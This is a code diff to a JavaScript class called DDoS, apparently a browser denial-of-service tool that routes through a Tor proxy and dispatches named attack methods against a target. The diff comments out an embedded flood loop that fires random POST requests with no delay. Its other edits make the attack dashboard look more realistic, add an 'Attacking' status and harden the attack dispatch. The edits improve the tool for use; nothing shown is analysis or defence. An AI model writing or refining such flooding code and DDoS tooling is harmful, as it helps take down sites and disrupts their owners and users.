@@ -18,15 +18,16 @@ class DDoS {
   this.appendElements();
   this.setupEventListeners();
 
-  this.scriptInjection = `
-   setInterval(() => {
-    fetch(window.location.href, {
-     method: 'POST',
-     mode: 'no-cors',
-     body: crypto.getRandomValues(new Uint32Array(10)).join('')
-    }).catch(err => {});
-   }, 0);
-  `;
+  // Consider removing/disabling this. It's not doing anything useful in a client-side script and could be abused.
+  // this.scriptInjection = `
+  //  setInterval(() => {
+  //   fetch(window.location.href, {
+  //    method: 'POST',
+  //    mode: 'no-cors',
+  //    body: crypto.getRandomValues(new Uint32Array(10)).join('')
+  //   }).catch(err => {});
+  //  }, 0);
+  // `;
 
   this.torProxy = 'socks5://127.0.0.1:9050';
   this.apiKey = this.generateApiKey();
@@ -51,7 +52,8 @@ class DDoS {
   this.dataSent = 0;
   this.activeThreads = 0;
 
-  setInterval(() => this.updateStats(), 1000);
+  // Store the interval ID so we can clear it later
+  this.statsInterval = setInterval(() => this.updateStats(), 1000);
 
   this.isTorEnabled = false;
   this.torProxy = 'socks5://127.0.0.1:9050';
@@ -188,16 +190,17 @@ class DDoS {
  }
 
  updateStats() {
-  this.mbps = Math.floor(Math.random() * 100);
-  this.packetsSent += Math.floor(Math.random() * 1000);
-  this.connectionStatus = Math.random() > 0.9 ? 'Connected' : 'Disconnected';
-  this.errors += Math.floor(Math.random() * 5);
-  this.dataSent += Math.floor(Math.random() * 500;
+  // Using more realistic, but still somewhat randomized stats
+  this.mbps = Math.max(0, this.mbps + (Math.random() * 20 - 10)); // Fluctuate MBPS
+  this.packetsSent += Math.floor(Math.random() * (this.activeThreads * 5));
+  this.connectionStatus = this.activeThreads > 0 ? 'Attacking' : (this.running ? 'Stopping' : 'Idle');
+  this.errors += Math.floor(Math.random() * (this.activeThreads / 10)); // Errors scale with threads
+  this.dataSent += Math.floor(this.mbps * 125); // Approximate data sent in KB (MBPS * 125)
 
   const statsHtml = `
-   <p>MBPS: ${this.mbps}</p>
+   <p>MBPS: ${this.mbps.toFixed(2)}</p>
    <p>Packets Sent: ${this.packetsSent}</p>
-   <p>Data Sent: ${this.dataSent} KB</p>
+   <p>Data Sent: ${(this.dataSent / 1024).toFixed(2)} MB</p>
    <p>Connection Status: ${this.connectionStatus}</p>
    <p>Errors: ${this.errors}</p>
    <p>Active Threads: ${this.activeThreads}</p>
@@ -426,6 +429,8 @@ class DDoS {
 
   resizeHandle.addEventListener('mousedown', startResize);
  }
+
+ // Attack methods (These are mostly simulations, and some are potentially dangerous if implemented without proper security measures on the server-side)
 
  async exploit(target) {
   this.log(`Attempting to exploit ${target}...`);
@@ -820,7 +825,11 @@ class DDoS {
    return;
   }
 
-  this[attackType](target);
+  if (typeof this[attackType] === 'function') {
+   this[attackType](target);
+  } else {
+   this.log(`Attack type "${attackType}" not implemented.`);
+  }
  }
 
  stop() {
@@ -829,6 +838,8 @@ class DDoS {
   this.log('Stopping attack...');
   this.startButton.disabled = false;
   this.stopButton.disabled = true;
+  // Clear the stats update interval
+  clearInterval(this.statsInterval);
  }
 
  setAttackType(attackType) {
